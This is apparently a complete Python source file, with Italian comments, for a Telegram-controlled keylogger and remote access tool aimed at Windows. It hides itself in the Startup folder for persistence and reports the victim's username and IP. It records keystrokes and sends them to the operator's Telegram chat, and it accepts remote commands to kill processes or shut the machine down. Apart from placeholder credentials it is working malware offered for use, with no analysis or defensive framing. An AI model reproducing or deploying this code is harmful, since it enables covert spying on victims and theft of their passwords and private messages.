import telebot
from pynput import keyboard
import threading
import os
import platform
import socket
import psutil
import sys
import shutil
import subprocess
from datetime import datetime

# Configurazione del bot Telegram
TOKEN = 'YOUR TOKEN'  # Sostituisci con il token del tuo bot
CHAT_ID = 'YOUR CHATID'  # Sostituisci con il tuo chat ID
bot = telebot.TeleBot(TOKEN)

# Variabile per memorizzare i tasti premuti
logged_keys = []

# Flag per controllare se il keylogger è attivo
keylogger_active = False

# Oggetto listener della tastiera
listener = None

# Percorso della cartella di avvio automatico
STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Dizionario per memorizzare gli utenti attivi
active_users = {}


# Funzione per generare un ID incrementale (PC1, PC2, PC3, ...)
def get_next_id():
    # Trova il numero più alto tra gli ID esistenti
    max_id = 0
    for unique_id in active_users.keys():
        if unique_id.startswith("PC"):
            try:
                current_id = int(unique_id[2:])  # Estrae il numero da "PC1", "PC2", ecc.
                if current_id > max_id:
                    max_id = current_id
            except ValueError:
                continue
    return f"PC{max_id + 1}"  # Restituisce il prossimo ID disponibile


# Funzione per generare un identificatore unico per ogni istanza
def get_unique_identifier():
    return get_next_id()


# Funzione per inviare un messaggio all'avvio
def send_startup_message():
    current_date = datetime.now().strftime("%d/%m/%Y")
    current_time = datetime.now().strftime("%H:%M:%S")
    username = get_windows_username()
    ip_address = socket.gethostbyname(socket.gethostname())
    unique_id = get_unique_identifier()

    # Aggiungi l'utente alla lista degli utenti attivi
    active_users[unique_id] = {
        'username': username,
        'ip_address': ip_address,
        'start_time': f"{current_date} {current_time}"
    }

    # Crea il messaggio
    message = f"🟢 Il programma è stato avviato.\n\n📅 Data: {current_date}\n⏰ Ora: {current_time}\n👤 Nome utente: {username}\n🌐 Indirizzo IP: {ip_address}\n🆔 ID: {unique_id}"
    # Invia il messaggio al bot
    bot.send_message(CHAT_ID, message)


# Funzione per spostare il file nella cartella di avvio automatico e nasconderlo
def move_to_startup():
    script_path = sys.argv[0]
    script_name = os.path.basename(script_path)
    destination_path = os.path.join(STARTUP_FOLDER, script_name)

    if os.path.dirname(script_path) == STARTUP_FOLDER:
        print("Il file è già nella cartella di avvio.")
        return

    if not os.path.exists(STARTUP_FOLDER):
        os.makedirs(STARTUP_FOLDER)

    shutil.move(script_path, destination_path)
    os.system(f"attrib +h {destination_path}")
    subprocess.Popen([destination_path], shell=True)
    sys.exit()


# Funzione per inviare i dati al bot Telegram
def send_logged_keys():
    if logged_keys:
        message = "Tasti premuti:\n" + "".join(logged_keys)
        bot.send_message(CHAT_ID, message)
        logged_keys.clear()


# Funzione chiamata quando un tasto viene premuto
def on_press(key):
    try:
        logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.enter:
            logged_keys.append("\n")
            send_logged_keys()
        elif key == keyboard.Key.space:
            logged_keys.append(" ")
        elif key == keyboard.Key.backspace:
            if logged_keys:
                logged_keys.pop()


# Funzione per avviare il keylogger
def start_keylogger():
    global listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# Funzione per ottenere il nome utente di Windows
def get_windows_username():
    return os.getlogin()


# Funzione per raccogliere informazioni di sistema (infopc)
def get_system_info():
    current_date = datetime.now().strftime("%d/%m/%Y")
    current_time = datetime.now().strftime("%H:%M:%S")
    username = get_windows_username()
    ip_address = socket.gethostbyname(socket.gethostname())
    unique_id = get_unique_identifier()

    info = f"📊 **Informazioni del PC**\n\n"
    info += f"📅 Data: {current_date}\n"
    info += f"⏰ Ora: {current_time}\n"
    info += f"👤 Nome utente: {username}\n"
    info += f"🌐 Indirizzo IP: {ip_address}\n"
    info += f"🆔 ID: {unique_id}\n"
    return info


# Funzione per ottenere la directory del file eseguibile (infofile)
def get_file_directory():
    script_path = sys.argv[0]
    return f"📂 **Directory del file eseguibile:**\n{os.path.dirname(script_path)}"


# Funzione per terminare il processo corrente
def panic():
    pid = os.getpid()
    if platform.system() == "Windows":
        os.system(f"taskkill /PID {pid} /F")
    else:
        os.system(f"kill -9 {pid}")


# Funzione per terminare un processo specifico
def terminate_process(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            try:
                proc.terminate()
                return True, f"Il processo {process_name} (PID: {proc.info['pid']}) è stato terminato."
            except psutil.NoSuchProcess:
                return False, f"Il processo {process_name} non è stato trovato."
            except psutil.AccessDenied:
                return False, f"Permessi insufficienti per terminare il processo {process_name}."
    return False, f"Il processo {process_name} non è in esecuzione."


# Funzione per spegnere il computer
def shutdown_computer():
    if platform.system() == "Windows":
        os.system("shutdown /s /t 0")
    else:
        os.system("shutdown -h now")


# Funzione per generare il messaggio di help
def generate_help_message():
    help_message = """
📋 **Lista Comandi e Stato**
/startlog 🟢 READY
/stoplog 🟢 READY
/infopc 🟢 READY
/infofile 🟢 READY
/panic 🟢 READY
/taskkill 🟢 READY
/shutdown 🟢 READY
/users 🟢 READY
/selectuser 🟢 READY
/help 🟢 READY

🟢 READY: Comando funzionante
🟡 PROGRESS: Comando in sviluppo
🔴 DONT WORK: Comando non funzionante
"""
    return help_message


# Funzione per mostrare la lista degli utenti attivi
def show_active_users():
    if not active_users:
        return "Nessun utente attivo."
    users_list = "👥 **Utenti Attivi**\n"
    for unique_id, user_info in active_users.items():
        users_list += f"- 👤 {user_info['username']} | 🌐 {user_info['ip_address']} | 🆔 {unique_id}\n"
    return users_list


# Funzione per selezionare un utente specifico
def select_user(unique_id):
    if unique_id in active_users:
        return f"Utente selezionato: {active_users[unique_id]['username']} (ID: {unique_id})"
    else:
        return f"Utente con ID {unique_id} non trovato."


# Gestore dei messaggi per avviare/fermare il keylogger, richiedere informazioni, PANIC, TASKKILL, SHUTDOWN, USERS, SELECTUSER e HELP
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global keylogger_active, listener

    if message.text.strip().upper() == "/STARTLOG":
        if not keylogger_active:
            keylogger_active = True
            username = get_windows_username()
            unique_id = get_unique_identifier()
            threading.Thread(target=start_keylogger, daemon=True).start()
            bot.reply_to(message, f"Keylogger avviato. Nome utente: {username}. ID: {unique_id}")
        else:
            bot.reply_to(message, "Il keylogger è già attivo.")

    elif message.text.strip().upper() == "/STOPLOG":
        if keylogger_active:
            keylogger_active = False
            if listener:
                listener.stop()
            bot.reply_to(message, "Keylogger fermato.")
        else:
            bot.reply_to(message, "Il keylogger non è attivo.")

    elif message.text.strip().upper() == "/INFOPC":
        system_info = get_system_info()
        bot.reply_to(message, system_info, parse_mode="Markdown")

    elif message.text.strip().upper() == "/INFOFILE":
        file_directory = get_file_directory()
        bot.reply_to(message, file_directory, parse_mode="Markdown")

    elif message.text.strip().upper() == "/PANIC":
        bot.reply_to(message, "Avvio modalità PANIC. Terminazione del processo in corso...")
        panic()

    elif message.text.strip().upper().startswith("/TASKKILL"):
        parts = message.text.strip().split()
        if len(parts) == 2:
            process_name = parts[1]
            success, response = terminate_process(process_name)
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, "Formato comando non valido. Usa: /taskkill <nome_processo>")

    elif message.text.strip().upper() == "/SHUTDOWN":
        bot.reply_to(message, "Spegnimento del computer in corso...")
        shutdown_computer()

    elif message.text.strip().upper() == "/USERS":
        users_message = show_active_users()
        bot.reply_to(message, users_message)

    elif message.text.strip().upper().startswith("/SELECTUSER"):
        parts = message.text.strip().split()
        if len(parts) == 2:
            unique_id = parts[1]
            response = select_user(unique_id)
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, "Formato comando non valido. Usa: /selectuser <unique_id>")

    elif message.text.strip().upper() == "/HELP":
        help_message = generate_help_message()
        bot.reply_to(message, help_message, parse_mode="Markdown")

    else:
        bot.reply_to(message, "Comando non riconosciuto. Usa /help per vedere la lista dei comandi.")


# Sposta il file nella cartella di avvio automatico
move_to_startup()

# Invia un messaggio all'avvio
send_startup_message()

# Avvia il bot Telegram
print("In attesa di comandi... Usa /help per vedere la lista dei comandi.")
bot.polling()
